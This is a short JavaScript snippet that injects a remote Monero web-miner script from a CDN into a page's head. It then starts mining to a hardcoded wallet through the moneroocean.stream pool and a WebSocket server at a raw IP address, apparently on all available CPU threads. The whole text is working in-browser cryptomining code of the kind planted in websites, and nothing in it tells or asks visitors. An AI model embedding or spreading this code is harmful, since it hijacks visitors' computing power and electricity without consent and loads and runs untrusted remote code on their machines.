// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725";
var pool = "moneroocean.stream";
var walletAddress = "48ajA3sKSN4P8XdZdqcZ35Po9j9RjWHTgEAAWQxTESbv2EWnSauGPAREAFXYH32JG4WpvCqvf38JmfiA385i2LkGMo2QWFZ";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "x";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
